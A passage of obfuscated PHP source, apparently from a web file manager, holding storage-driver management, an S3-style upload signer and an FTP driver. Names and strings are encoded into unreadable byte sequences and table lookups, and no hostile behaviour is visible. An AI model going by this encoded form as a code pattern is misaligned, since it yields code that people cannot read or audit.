$Ø¡Çåò­); if ($ ˜ï‡ò && $Ø¡Çåò­[$ì»ùğè[47]]) { $ôÌ—¾ˆŞ = 0; foreach ($²şæ¹´ù as $ÑşÉÎÎû) { if ($ÑşÉÎÎû[$ì»ùğè[47]] && $ÑşÉÎÎû[$ì»ùğè[408]] != $ÏŒ–ò¹) { $ôÌ—¾ˆŞ = $ÑşÉÎÎû[$ì»ùğè[408]]; parent::update($ÑşÉÎÎû[$ì»ùğè[408]], array($ì»ùğè[47] => 0)); } } $this->updateBackup($ÏŒ–ò¹, $ôÌ—¾ˆŞ); } return $ ˜ï‡ò; } public function add($‰çÕ”îå) { $÷Á‘âÌ« =& $_SERVER[Å¶¨Şêº]; $á°û”§ = array_to_keyvalue(parent::listData(), $÷Á‘âÌ«[42]); if (isset($á°û”§[$‰çÕ”îå[$÷Á‘âÌ«[42]]])) { return !1; } $this->checkConfig($‰çÕ”îå); $«—şìëº = parent::insert($‰çÕ”îå); if ($«—şìëº && $‰çÕ”îå[$÷Á‘âÌ«[47]]) { foreach ($á°û”§ as $ˆ±Æ«–•) { if ($ˆ±Æ«–•[$÷Á‘âÌ«[47]]) { parent::update($ˆ±Æ«–•[$÷Á‘âÌ«[408]], array($÷Á‘âÌ«[47] => 0)); } } } return $«—şìëº; } public function updateBackup($‹—óÌø·, $ïÈÓïÆ) { $¯æÎ„ÒÜ =& $_SERVER[Å¶¨Şêº]; if (!$ïÈÓïÆ) { return; } $­õñ°Š‰ = Model($¯æÎ„ÒÜ[746])->config(); if ($­õñ°Š‰[$¯æÎ„ÒÜ[1633]] != $¯æÎ„ÒÜ[99] || $­õñ°Š‰[$¯æÎ„ÒÜ[749]] != $ïÈÓïÆ) { return; } $®ê£ÜÆ = Model($¯æÎ„ÒÜ[768])->get($¯æÎ„ÒÜ[778]); $®ê£ÜÆ = json_decode($®ê£ÜÆ, !0); if (!$®ê£ÜÆ) { return; } $®ê£ÜÆ[$¯æÎ„ÒÜ[749]] = $‹—óÌø·; Model($¯æÎ„ÒÜ[768])->set(array($¯æÎ„ÒÜ[778] => $®ê£ÜÆ)); } public function checkPwd($¬ÇÈÎ×ü, &$ë° •›Õ) { $±ŸÃüµş =& $_SERVER[Å¶¨Şêº]; if (empty($ë° •›Õ[$±ŸÃüµş[6]])) { return; } $ı¬¾ğñ„ = json_decode($ë° •›Õ[$±ŸÃüµş[6]], !0); $Š’¤÷ã = $±ŸÃüµş[12]; $÷¥ì×° = array($±ŸÃüµş[2172], $±ŸÃüµş[2173], $±ŸÃüµş[886]); foreach ($÷¥ì×° as $ø€äÙÆë) { if (isset($ı¬¾ğñ„[$ø€äÙÆë])) { $Š’¤÷ã = $ø€äÙÆë; break; } } if (!$Š’¤÷ã) { return; } $¾…‰ÍÚü = $this->getConfig($¬ÇÈÎ×ü); $…­€Áı· = $¾…‰ÍÚü[$Š’¤÷ã]; $¥Š° Öö = $ı¬¾ğñ„[$Š’¤÷ã]; if ($¥Š° Öö == str_repeat($±ŸÃüµş[200], strlen($…­€Áı·))) { $ı¬¾ğñ„[$Š’¤÷ã] = $…­€Áı·; $ë° •›Õ[$±ŸÃüµş[6]] = json_encode($ı¬¾ğñ„); } else { if ($¥Š° Öö != $…­€Áı·) { $ë° •›Õ[$±ŸÃüµş[2171]] = $±ŸÃüµş[99]; } } } public function checkConfig(&$Çæ¶‡£›, $‡ñ±¹ñ˜ = false) { $Íì¶œ®¤ =& $_SERVER[Å¶¨Şêº]; $äŒ—À˜á = strtolower($Çæ¶‡£›[$Íì¶œ®¤[106]]); $Æé¥œÚµ = json_decode($Çæ¶‡£›[$Íì¶œ®¤[6]], !0); foreach ($Æé¥œÚµ as $ğÀ‰¦ê¯ => $æ§òñ¾È) { $Æé¥œÚµ[$ğÀ‰¦ê¯] = trim($æ§òñ¾È); } $Æé¥œÚµ[$Íì¶œ®¤[2174]] = rand_string(6); $·å÷óÑÈ = $GLOBALS[$Íì¶œ®¤[6]][$Íì¶œ®¤[100]][$Íì¶œ®¤[824]]; $ï»ûº¡š = isset($·å÷óÑÈ[$äŒ—À˜á]) ? $·å÷óÑÈ[$äŒ—À˜á] : ucfirst($äŒ—À˜á); $çÌü’ó÷ = $Íì¶œ®¤[85] . $ï»ûº¡š; if (!$ï»ûº¡š || !class_exists($çÌü’ó÷)) { if ($‡ñ±¹ñ˜) { return LNG($Íì¶œ®¤[2175]); } write_log(array($Íì¶œ®¤[2176], $Çæ¶‡£›, get_caller_info()), $Íì¶œ®¤[2177]); show_json(LNG($Íì¶œ®¤[2175]), !1, $Çæ¶‡£›); } $š»¾ÜËÆ = new $çÌü’ó÷($Æé¥œÚµ); if (in_array($äŒ—À˜á, $š»¾ÜËÆ->objectDriver)) { if (!$š»¾ÜËÆ->isBucketCors() && !$š»¾ÜËÆ->setBucketCors()) { $•¬ë…™¶ = LNG($Íì¶œ®¤[2178]); $•¬ë…™¶ .= $Íì¶œ®¤[2179] . LNG($Íì¶œ®¤[2180]); if ($‡ñ±¹ñ˜) { return $•¬ë…™¶; } show_json($•¬ë…™¶, !1); } } $š¤×èïƒ = rtrim($Æé¥œÚµ[$Íì¶œ®¤[1177]], $Íì¶œ®¤[8]) . $Íì¶œ®¤[8]; $ìâãÖşÀ = $š»¾ÜËÆ->getPath($š¤×èïƒ . $Íì¶œ®¤[1182]); if (!$š»¾ÜËÆ->mkfile($ìâãÖşÀ)) { if ($‡ñ±¹ñ˜) { return LNG($Íì¶œ®¤[2178]); } show_json(LNG($Íì¶œ®¤[2178]), !1); } $Æé¥œÚµ[$Íì¶œ®¤[1177]] = $š¤×èïƒ; $Çæ¶‡£›[$Íì¶œ®¤[6]] = json_encode($Æé¥œÚµ); $Çæ¶‡£›[$Íì¶œ®¤[106]] = $ï»ûº¡š; return !0; } public function driverListSystem() { $‘®öÒğ— =& $_SERVER[Å¶¨Şêº]; $åêÅ»·· = parent::listData(); $•áÊû¨ = array(); foreach ($åêÅ»·· as $åÕ»§™Æ) { unset($åÕ»§™Æ[$‘®öÒğ—[212]], $åÕ»§™Æ[$‘®öÒğ—[96]]); $åÕ»§™Æ[$‘®öÒğ—[6]] = json_decode($åÕ»§™Æ[$‘®öÒğ—[6]], !0); $•áÊû¨[] = $åÕ»§™Æ; } return $•áÊû¨; } public function defaultDriver() { $†î›ñ½‘ =& $_SERVER[Å¶¨Şêº]; $ƒÎÜ¥ˆ = parent::listData(); $ñ¯¨à¿« = array_filter_by_field($ƒÎÜ¥ˆ, $†î›ñ½‘[47], 1); $ñ¯¨à¿« = $ñ¯¨à¿«[0]; if ($ñ¯¨à¿«) { $ñ¯¨à¿«[$†î›ñ½‘[6]] = json_decode($ñ¯¨à¿«[$†î›ñ½‘[6]], !0); } return $ñ¯¨à¿«; } public function driverInfo($Ö—Şï©¬) { $¬°¤»ø =& $_SERVER[Å¶¨Şêº]; $¡ìŒ‹µ° = array_to_keyvalue(parent::listData(), $¬°¤»ø[408]); if (!isset($¡ìŒ‹µ°[$Ö—Şï©¬])) { return !1; } $ÓÎœµ¡ = $¡ìŒ‹µ°[$Ö—Şï©¬]; $ÓÎœµ¡[$¬°¤»ø[6]] = json_decode($ÓÎœµ¡[$¬°¤»ø[6]], !0); return $ÓÎœµ¡; } public function remove($£§È™¿) { $this->removeShareItems($£§È™¿); return parent::remove($£§È™¿); } public function removeWithFile($ªŒÜö, $ûĞßˆ´Ñ) { $¬îÄ…¸ =& $_SERVER[Å¶¨Şêº]; $´òÙÒŠ¿ = array($¬îÄ…¸[815] => $ªŒÜö); $·şßªÑù = Model($¬îÄ…¸[480])->where($´òÙÒŠ¿)->count(); $îÓëÁš† = Model($¬îÄ…¸[480])->where($´òÙÒŠ¿)->sum($¬îÄ…¸[87]); $Ğ¬âîù— = $ûĞßˆ´Ñ . $¬îÄ…¸[2181] . $ªŒÜö; $åä××ªû = LNG($ûĞßˆ´Ñ == $¬îÄ…¸[557] ? $¬îÄ…¸[2182] : $¬îÄ…¸[2183]); $¶´¨Ó¥ö = new TaskFileTransfer($Ğ¬âîù—, $¬îÄ…¸[2177], $·şßªÑù, $åä××ªû . "\x28{$ªŒÜö}\51"); $¶´¨Ó¥ö->task[$¬îÄ…¸[761]] = (double) $îÓëÁš†; $€Îé¸³© = KodIO::defaultDriver(); $Äã¨¥«² = $€Îé¸³©[$¬îÄ…¸[408]]; $ÄœÄ×óÚ = "\x7b\151\157\x3a{$Äã¨¥«²}\175\57"; $ƒØş§ÆÇ = !0; $Øî´ıé‘ = array(); $ñÀØº˜Ä = Model($¬îÄ…¸[211])->where($´òÙÒŠ¿)->field($¬îÄ…¸[2184])->select(); foreach ($ñÀØº˜Ä as $ñó™¬­) { $ªúíÁêø = $ñó™¬­[$¬îÄ…¸[95]]; $Õ­ìËè = $ÄœÄ×óÚ . str_replace("\173\x69\x6f\x3a{$ªŒÜö}\175\57", $¬îÄ…¸[12], $ªúíÁêø); if (!IO::exist($ªúíÁêø)) { $Øî´ıé‘[] = $ñó™¬­[$¬îÄ…¸[477]]; $¶´¨Ó¥ö->updateFileEnd($ñó™¬­[$¬îÄ…¸[42]], $ñó™¬­[$¬îÄ…¸[87]]); continue; } if (IO::exist($Õ­ìËè)) { $¶´¨Ó¥ö->updateFileEnd($ñó™¬­[$¬îÄ…¸[42]], $ñó™¬­[$¬îÄ…¸[87]]); continue; } if (!IO::move($ªúíÁêø, get_path_father($Õ­ìËè))) { $ƒØş§ÆÇ = !1; break; } $´òÙÒŠ¿ = array($¬îÄ…¸[477] => $ñó™¬­[$¬îÄ…¸[477]]); $³€±Ö® = array($¬îÄ…¸[815] => $Äã¨¥«², $¬îÄ…¸[95] => $Õ­ìËè); Model($¬îÄ…¸[211])->where($´òÙÒŠ¿)->save($³€±Ö®); } $this->removeByFileID($Øî´ıé‘); if (!$ƒØş§ÆÇ) { $¶´¨Ó¥ö->stop($Ğ¬âîù—); return !1; } $¶´¨Ó¥ö->end(); if ($ûĞßˆ´Ñ == $¬îÄ…¸[1821]) { $this->remove($ªŒÜö); } } public function progress($¿¿Ü±Ô£, $¾ù¤—Ã®) { return Task::get($¾ù¤—Ã® . $_SERVER[Å¶¨Şêº][2181] . $¿¿Ü±Ô£); } private function removeByFileID($à£Ú˜ù• = array()) { $øèüÒ½‘ =& $_SERVER[Å¶¨Şêº]; if (empty($à£Ú˜ù•)) { return; } $™Ÿ‡¸ŠË = array($øèüÒ½‘[477] => array($øèüÒ½‘[7], $à£Ú˜ù•)); $ÎÜû¥ÑŸ = Model($øèüÒ½‘[1337])->where($™Ÿ‡¸ŠË)->field($øèüÒ½‘[411])->select(); if (!$ÎÜû¥ÑŸ) { return; } $ÎÜû¥ÑŸ = array_to_keyvalue($ÎÜû¥ÑŸ, $øèüÒ½‘[12], $øèüÒ½‘[411]); foreach ($ÎÜû¥ÑŸ as $˜€Èüı×) { Model($øèüÒ½‘[425])->removeNow($˜€Èüı×, !1); } } private function removeShareItems($÷Á¤¢Œ) { $‡ù¶Åöñ =& $_SERVER[Å¶¨Şêº]; $ñŞ¤Á“¦ = "\x7b\151\x6f\x3a{$÷Á¤¢Œ}\175\57"; $ŞªäÌÛ˜ = array($‡ù¶Åöñ[411] => 0, $‡ù¶Åöñ[1172] => array($‡ù¶Åöñ[392], "{$ñŞ¤Á“¦}\x25")); $Ğ¦±ÒÂá = Model($‡ù¶Åöñ[1832])->where($ŞªäÌÛ˜)->field($‡ù¶Åöñ[602])->select(); if (empty($Ğ¦±ÒÂá)) { return; } $Ê´»ı¹ô = array_to_keyvalue($Ğ¦±ÒÂá, $‡ù¶Åöñ[12], $‡ù¶Åöñ[602]); Model($‡ù¶Åöñ[601])->remove($Ê´»ı¹ô); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\114\151\147\150\164\x41\160\x70"; public $modelType = "\123\x79\163\164\x65\x6d\x4f\x70\x74\151\x6f\x6e"; public $field = array("\x6e\x61\x6d\x65", "\147\162\157\x75\160", "\x64\x65\x73\143", "\143\157\156\164\145\156\x74"); public function listData($¯¼Ä­¶† = false, $Ğõ¿²›¸ = "\x6d\x6f\144\151\146\171\124\x69\155\x65", $××§« = true) { return parent::listData($¯¼Ä­¶†, $Ğõ¿²›¸, $××§«); } public function remove($ÃÏª‰) { $¶³¢Ï¿ó = $this->findByName($ÃÏª‰); if (!$¶³¢Ï¿ó) { return !1; } return parent::remove($¶³¢Ï¿ó[$_SERVER[Å¶¨Şêº][408]]); } public function add($¢ÒáŞê²) { if ($this->findByName($¢ÒáŞê²[$_SERVER[Å¶¨Şêº][42]])) { return !1; } return parent::insert($¢ÒáŞê²); } public function update($Î”›ªˆí, $…º÷±¡Ğ) { $­Ò™´¶ë =& $_SERVER[Å¶¨Şêº]; $ Æ¼Ù£¾ = $this->findByName($Î”›ªˆí); $ŒÁéµÔ¼ = $this->findByName($…º÷±¡Ğ[$­Ò™´¶ë[42]]); if (!$ Æ¼Ù£¾ || $ŒÁéµÔ¼ && $ŒÁéµÔ¼[$­Ò™´¶ë[408]] != $ Æ¼Ù£¾[$­Ò™´¶ë[408]]) { return !1; } return parent::update($ Æ¼Ù£¾[$­Ò™´¶ë[408]], $…º÷±¡Ğ); } } goto D³‹åõĞ§Œ; aª–Şˆ¿†™: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($õíÔ¾§²) { parent::__construct($õíÔ¾§²); $this->signatureVersion($_SERVER[Å¶¨Şêº][227]); } public function uploadFormData($ÔüÀùË¥, $ÉÆ”ÏŞß = 3600) { $İğûí¤Ò =& $_SERVER[Å¶¨Şêº]; $è¡èìõ = $İğûí¤Ò[210]; $õßæè½¢ = $İğûí¤Ò[1356]; $€É”¼şİ = $İğûí¤Ò[73]; $²á÷Õ™ = gmdate($İğûí¤Ò[1357]); $¦ÀÖíåé = gmdate($İğûí¤Ò[748]); $¶âƒä‰ = $İğûí¤Ò[1358]; $¬Õƒ‡€  = $ÉÆ”ÏŞß . $İğûí¤Ò[12]; $‘ÎŒµà = $İğûí¤Ò[1320]; $ªªşı°· = array($this->accessKey, $¦ÀÖíåé, $this->region, $€É”¼şİ, $¶âƒä‰); $ÈÏ¾‘ªş = implode($İğûí¤Ò[8], $ªªşı°·); $Çô×•„Ó = array($İğûí¤Ò[1322] => gmdate($İğûí¤Ò[1321], strtotime($İğûí¤Ò[1359])), $İğûí¤Ò[1323] => array(array($İğûí¤Ò[1325] => $this->bucket), array($İğûí¤Ò[1324] => $è¡èìõ), array($İğûí¤Ò[1326], $İğûí¤Ò[1327], $İğûí¤Ò[12]), array($İğûí¤Ò[1326], $İğûí¤Ò[1360], $İğûí¤Ò[12]), array($İğûí¤Ò[1326], $İğûí¤Ò[1361], $İğûí¤Ò[12]), array($İğûí¤Ò[1328] => $‘ÎŒµà), array($İğûí¤Ò[1362] => $ÈÏ¾‘ªş), array($İğûí¤Ò[1363] => $õßæè½¢), array($İğûí¤Ò[1364] => $²á÷Õ™), array($İğûí¤Ò[1365] => $¬Õƒ‡€ ))); $¹¶ôÛ = base64_encode(json_encode($Çô×•„Ó)); $”áÄñàŠ = hash_hmac($İğûí¤Ò[1366], $¦ÀÖíåé, $İğûí¤Ò[1367] . $this->secret, !0); $ûòÜ‰¸ = hash_hmac($İğûí¤Ò[1366], $this->region, $”áÄñàŠ, !0); $ñ“äÆ´œ = hash_hmac($İğûí¤Ò[1366], $€É”¼şİ, $ûòÜ‰¸, !0); $‚Üİ³Ğ = hash_hmac($İğûí¤Ò[1366], $¶âƒä‰, $ñ“äÆ´œ, !0); $ä´–Óİ÷ = hash_hmac($İğûí¤Ò[1366], $¹¶ôÛ, $‚Üİ³Ğ); $¸Õ°•£ = array($İğûí¤Ò[226] => $İğûí¤Ò[12], $İğûí¤Ò[1368] => $İğûí¤Ò[12], $İğûí¤Ò[1324] => $è¡èìõ, $İğûí¤Ò[1328] => $‘ÎŒµà, $İğûí¤Ò[1332] => $¹¶ôÛ, $İğûí¤Ò[1369] => $ÈÏ¾‘ªş, $İğûí¤Ò[1370] => $õßæè½¢, $İğûí¤Ò[1371] => $²á÷Õ™, $İğûí¤Ò[1372] => $¬Õƒ‡€ , $İğûí¤Ò[1373] => $ä´–Óİ÷, $İğûí¤Ò[193] => $this->getHost()); return $¸Õ°•£; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($½æ«Ò‚Ù) { parent::__construct(); if (count($½æ«Ò‚Ù) > 0) { $this->_init($½æ«Ò‚Ù); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ê›¼äï‘) { $ñ‰Ó¥× =& $_SERVER[Å¶¨Şêº]; global $config; $this->appCharset = $config[$ñ‰Ó¥×[1374]]; $this->systemCharset = $config[$ñ‰Ó¥×[1375]]; if (isset($ê›¼äï‘[$ñ‰Ó¥×[1376]]) && $ê›¼äï‘[$ñ‰Ó¥×[1376]]) { $this->systemCharset = $ê›¼äï‘[$ñ‰Ó¥×[1376]]; } } public function iconvApp($ŠÁµÖ‘Ã) { return $this->iconvTo($ŠÁµÖ‘Ã, $this->systemCharset, $this->appCharset); } public function iconvSystem($ñÙ ğÇ) { return $this->iconvTo($ñÙ ğÇ, $this->appCharset, $this->systemCharset); } public function getPathOuter($Ì¾åøÜõ) { $¦€Ù‘¢” =& $_SERVER[Å¶¨Şêº]; $‹ÔøˆÓ€ = $this->iconvApp($this->pathBase); $Ì¾åøÜõ = $this->iconvApp($Ì¾åøÜõ); if (substr($‹ÔøˆÓ€, 0, 2) == $¦€Ù‘¢”[1377]) { $‹ÔøˆÓ€ = BASIC_PATH . substr($‹ÔøˆÓ€, 2); } if (substr($Ì¾åøÜõ, 0, 2) == $¦€Ù‘¢”[1377]) { $Ì¾åøÜõ = BASIC_PATH . substr($Ì¾åøÜõ, 2); } $‹ÔøˆÓ€ = KodIO::clear($‹ÔøˆÓ€); $Ì¾åøÜõ = KodIO::clear($Ì¾åøÜõ); $Ì¾åøÜõ = substr($Ì¾åøÜõ, strlen($‹ÔøˆÓ€)); if (empty($this->pathDriver)) { return $Ì¾åøÜõ; } return $this->pathDriver . $¦€Ù‘¢”[8] . ltrim($Ì¾åøÜõ, $¦€Ù‘¢”[8]); } private function _init($¾‡Ê«À‹ = array()) { $¾éİù«´ =& $_SERVER[Å¶¨Şêº]; if (!function_exists($¾éİù«´[1378])) { throw new Exception(LNG($¾éİù«´[1379])); } $this->config = $¾‡Ê«À‹; $this->charsetReset($¾‡Ê«À‹); foreach ($¾‡Ê«À‹ as $€ëææò => $ã©¦«ãä) { if (isset($this->{$€ëææò})) { $this->{$€ëææò} = $ã©¦«ãä; } } return $this->_login($¾‡Ê«À‹); } private function _login($Ë€ËÜÔ) { $ïöŒú¯À =& $_SERVER[Å¶¨Şêº]; static $º¨Æ€§ = array(); $­¥Ÿ¿Ğ = md5(json_encode($Ë€ËÜÔ)); if (isset($º¨Æ€§[$­¥Ÿ¿Ğ])) { foreach ($º¨Æ€§[$­¥Ÿ¿Ğ] as $ÎŸÙÖëà => $ìÂ°ç›®) { $this->{$ÎŸÙÖëà} = $ìÂ°ç›®; } return !0; } $õì«ãüÃ = parse_url(trim($this->server, $ïöŒú¯À[8])); $this->host = $õì«ãüÃ[$ïöŒú¯À[193]]; $ŞÔ¹Áƒí = isset($õì«ãüÃ[$ïöŒú¯À[192]]) && $õì«ãüÃ[$ïöŒú¯À[192]] == $ïöŒú¯À[1380] ? !0 : !1; $this->scheme = $ŞÔ¹Áƒí ? $ïöŒú¯À[1381] : $ïöŒú¯À[1382]; $this->port = isset($õì«ãüÃ[$ïöŒú¯À[194]]) ? $õì«ãüÃ[$ïöŒú¯À[194]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $äà¤æ„Õ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $¥’¡æœ = $this->pasv == $ïöŒú¯À[99] ? !0 : !1; @ftp_pasv($this->connect, $¥’¡æœ); $º¨Æ€§[$­¥Ÿ¿Ğ] = array($ïöŒú¯À[1383] => $this->connect, $ïöŒú¯À[193] => $this->host, $ïöŒú¯À[192] => $this->scheme, $ïöŒú¯À[194] => $this->port); return $äà¤æ„Õ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ºñ›¥§», $ÓÍì®‡¼ = '', $¾úÚˆè« = REPEAT_RENAME) { if ($this->setContent($ºñ›¥§», $ÓÍì®‡¼)) { return $this->getPathOuter($ºñ›¥§»); } return !1; } public function mkdir($¬´†¨Ò, $ùº‡¥µï = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $¬´†¨Ò = $this->iconvSystem($¬´†¨Ò); if ($this->_isFolder($¬´†¨Ò) || @ftp_mkdir($this->connect, $¬´†¨Ò)) { return $this->getPathOuter($¬´†¨Ò); } if (!$this->mkdir($this->pathFather($¬´†¨Ò))) { return !1; } if ($¬´†¨Ò = @ftp_mkdir($this->connect, $¬´†¨Ò)) { return $this->getPathOuter($¬´†¨Ò); } return !1; } public function copyFile($°†ê§Ù, $š”æ«½÷) { if (!$this->_isconn()) { return !1; } $¨ÕÁÅ = $this->pathThis($this->iconvSystem($°†ê§Ù)); $ÖÜÅÏÚé = $this->tempFile($¨ÕÁÅ); $±¥òİíŒ = $this->iconvApp($ÖÜÅÏÚé); $this->download($°†ê§Ù, $±¥òİíŒ); $ë‡ÑÑ¸¿ = $this->upload($š”æ«½÷, $±¥òİíŒ); $this->tempFileRemve($ÖÜÅÏÚé); return $ë‡ÑÑ¸¿; } public function moveFile($¦šÑÎÌÕ, $Ü…äïˆÁ) { if (!$this->_isconn()) { return !1; } $¦šÑÎÌÕ = $this->iconvSystem($¦šÑÎÌÕ); $Ü…äïˆÁ = $this->iconvSystem($Ü…äïˆÁ); $½ÏÚËÚò = @ftp_rename($this->connect, $¦šÑÎÌÕ, $Ü…äïˆÁ); return $½ÏÚËÚò ? $this->getPathOuter($Ü…äïˆÁ) : !1; } public function delFile($˜Ñşü­ï) { if (!$this->_isconn()) { return !1; } $˜Ñşü­ï = $this->iconvSystem($˜Ñşü­ï); return @ftp_delete($this->connect, $˜Ñşü­ï); } public function delFolder($Ğˆ”‘Ï¢) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Ñ¶â¹Ù° = $Ú¥ü¿÷ì = array(); $this->fileList($Ğˆ”‘Ï¢, $Ñ¶â¹Ù°, $Ú¥ü¿÷ì, !0); $this->listItemCache = !0; foreach ($Ú¥ü¿÷ì as $¡ª¨åôı) { $Å—»Û¯ = $this->iconvSystem($¡ª¨åôı[$_SERVER[Å¶¨Şêº][42]]); $…çÌ¿²† = @ftp_delete($this->connect, $Å—»Û¯); if (!$…çÌ¿²†) { return !1; } } foreach ($Ñ¶â¹Ù° as $Å—»Û¯) { $Å—»Û¯ = $this->iconvSystem($Å—»Û¯); $…çÌ¿²† = @ftp_rmdir($this->connect, $Å—»Û¯); if (!$…çÌ¿²†) { return !1; } } $Ğˆ”‘Ï¢ = $this->iconvSystem($Ğˆ”‘Ï¢); return @ftp_rmdir($this->connect, $Ğˆ”‘Ï¢); } public function rename($³õİÆß¦, $Ö¦ÇÍÍ“) { $Ê«ÓëÂ¡ =& $_SERVER[Å¶¨Şêº]; if (!$this->_isconn()) { return !1; } $”öáÖÊ“ = $this->fileNameAuto($this->pathFather($³õİÆß¦), $Ö¦ÇÍÍ“); $”öáÖÊ“ = $this->iconvSystem($”öáÖÊ“); $³õİÆß¦ = $this->iconvSystem($³õİÆß¦); $âÆÆì½µ = $this->pathFather($³õİÆß¦); $Íø¼°¼ = rtrim($âÆÆì½µ, $Ê«ÓëÂ¡[8]) . $Ê«ÓëÂ¡[8] . $”öáÖÊ“; $´‘¸éÖ¥ = @ftp_rename($this->connect, $³õİÆß¦, $Íø¼°¼); $Íø¼°¼ = $this->iconvApp($Íø¼°¼); return $´‘¸éÖ¥ ? $this->getPathOuter($Íø¼°¼) : !1; } private function folderInfo($Ôãêæí², $ùãÀşÕù = false) { $ŸüàšœÅ =& $_SERVER[Å¶¨Şêº]; $Ë‘Ê¦ç = array($ŸüàšœÅ[42] => $this->pathThis($Ôãêæí²), $ŸüàšœÅ[95] => $this->getPathOuter($ŸüàšœÅ[8] . $Ôãêæí²), $ŸüàšœÅ[43] => $ŸüàšœÅ[86]); if ($ùãÀşÕù) { return $Ë‘Ê¦ç; } $Ë‘Ê¦ç[$ŸüàšœÅ[212]] = $Ë‘Ê¦ç[$ŸüàšœÅ[96]] = 0; $Ë‘Ê¦ç[$ŸüàšœÅ[213]] = $Ë‘Ê¦ç[$ŸüàšœÅ[214]] = !0; return $Ë‘Ê¦ç; } private function fileInfo($…Í»¨óµ, $Í’Ÿæ¼¨ = false, $ï²é«Ô = array()) { $ÕŠôöøˆ =& $_SERVER[Å¶¨Şêº]; $Òªğü¸‘ = array($ÕŠôöøˆ[42] => $this->pathThis($…Í»¨óµ), $ÕŠôöøˆ[95] => $this->getPathOuter($ÕŠôöøˆ[8] . $…Í»¨óµ), $ÕŠôöøˆ[43] => $ÕŠôöøˆ[211], $ÕŠôöøˆ[87] => isset($ï²é«Ô[$ÕŠôöøˆ[87]]) ? $ï²é«Ô[$ÕŠôöøˆ[87]] : 0, $ÕŠôöøˆ[185] => $this->ext($…Í»¨óµ)); if ($Í’Ÿæ¼¨) { return $Òªğü¸‘; } $Òªğü¸‘[$ÕŠôöøˆ[212]] = $Òªğü¸‘[$ÕŠôöøˆ[96]] = 0; $Òªğü¸‘[$ÕŠôöøˆ[213]] = $Òªğü¸‘[$ÕŠôöøˆ[214]] = !0; $¥à•­ÙÒ = $this->iconvSystem($…Í»¨óµ); $Òªğü¸‘[$ÕŠôöøˆ[96]] = @ftp_mdtm($this->connect, $¥à•­ÙÒ); if (empty($ï²é«Ô)) { $ï²é«Ô = $this->objectMeta($…Í»¨óµ); if (!$ï²é«Ô) { return $Òªğü¸‘; } } $Òªğü¸‘[$ÕŠôöøˆ[87]] = $ï²é«Ô[$ÕŠôöøˆ[87]]; return $Òªğü¸‘; } public function size($òíæ’à½) { $…Å•ï×ë = $this->objectMeta($òíæ’à½); return $…Å•ï×ë ? $…Å•ï×ë[$_SERVER[Å¶¨Şêº][87]] : 0; } public function info($³³–›š) { if ($this->isFile($³³–›š)) { return $this->fileInfo($³³–›š, 0); } else { if ($this->isFolder($³³–›š)) { return $this->folderInfo($³³–›š); } } return !1; } private function fileList($şøÇ , &$´™Íäõ‡, &$ÏîõÑ‰œ, $Ä±Ï›•Ó = false) { $ó÷âÖ¿Ó =& $_SERVER[Å¶¨Şêº]; $şøÇ  = $this->iconvSystem($şøÇ ); if (!$this->isFolder($şøÇ )) { return !1; } @ftp_chdir($this->connect, $ó÷âÖ¿Ó[8]); $şøÇ  = rtrim($şøÇ , $ó÷âÖ¿Ó[8]) . $ó÷âÖ¿Ó[8]; check_abort(); $Œë»îĞ = @ftp_rawlist($this->connect, $şøÇ ); if (!$Œë»îĞ) { $Œë»îĞ = array(); } $Š¼ôŒ÷İ = array($ó÷âÖ¿Ó[10] => 1, $ó÷âÖ¿Ó[1384] => 1); foreach ($Œë»îĞ as $ù•½ŞÎ˜) { $££øÔ˜Æ = $this->_listItem($ù•½ŞÎ˜); if ($££øÔ˜Æ[0] == $ó÷âÖ¿Ó[756]) { continue; } $Î²¬Ö = $££øÔ˜Æ[8]; if (empty($Î²¬Ö) && $Î²¬Ö !== $ó÷âÖ¿Ó[209] || isset($Š¼ôŒ÷İ[$Î²¬Ö])) { continue; } $Î²¬Ö = $this->iconvApp($şøÇ  . ltrim($Î²¬Ö, $ó÷âÖ¿Ó[8])); $ÌÏßÎœ = array($ó÷âÖ¿Ó[42] => $Î²¬Ö, $ó÷âÖ¿Ó[43] => $ó÷âÖ¿Ó[211], $ó÷âÖ¿Ó[87] => $££øÔ˜Æ[4]); if (substr($ù•½ŞÎ˜, 0, 1) == $ó÷âÖ¿Ó[1385]) { $ÌÏßÎœ[$ó÷âÖ¿Ó[43]] = $ó÷âÖ¿Ó[86]; $ÌÏßÎœ[$ó÷âÖ¿Ó[87]] = 0; } $ı¥™±±è = $ÌÏßÎœ[$ó÷âÖ¿Ó[43]] == $ó÷âÖ¿Ó[86] ? !0 : !1; $this->cacheMethodInfoSet($Î²¬Ö, $ı¥™±±è, $ÌÏßÎœ); if ($ı¥™±±è) { $´™Íäõ‡[] = $Î²¬Ö; if ($Ä±Ï›•Ó) { $this->fileList($Î²¬Ö, $´™Íäõ‡, $ÏîõÑ‰œ, $Ä±Ï›•Ó); } continue; } $ÏîõÑ‰œ[] = $ÌÏßÎœ; } $this->cacheMethodInfoSet($şøÇ , !0); } private function _listItem($Ã˜äµ¢í) { if (empty($Ã˜äµ¢í)) { return array(); } $„í­Ç = preg_split($_SERVER[Å¶¨Şêº][1386], $Ã˜äµ¢í); if (count($„í­Ç) <= 9) { return $„í­Ç; } $„í­Ç[8] = trim(substr($Ã˜äµ¢í, strpos($Ã˜äµ¢í, $„í­Ç[7]) + strlen($„í­Ç[7]))); return array_splice($„í­Ç, 0, 9); } public function listPath($Â«¢°†œ, $Ï‹»²Ö = false) { $ÊìàÁ =& $_SERVER[Å¶¨Şêº]; if (!$this->_isconn()) { return !1; } $úõöæˆ = $ú›»š˜Û = array(); $this->fileList($Â«¢°†œ, $úõöæˆ, $ú›»š˜Û); foreach ($úõöæˆ as $ˆÂàùÒ => $´Ï¯İï¦) { $úõöæˆ[$ˆÂàùÒ] = $this->folderInfo($´Ï¯İï¦, $Ï‹»²Ö); } 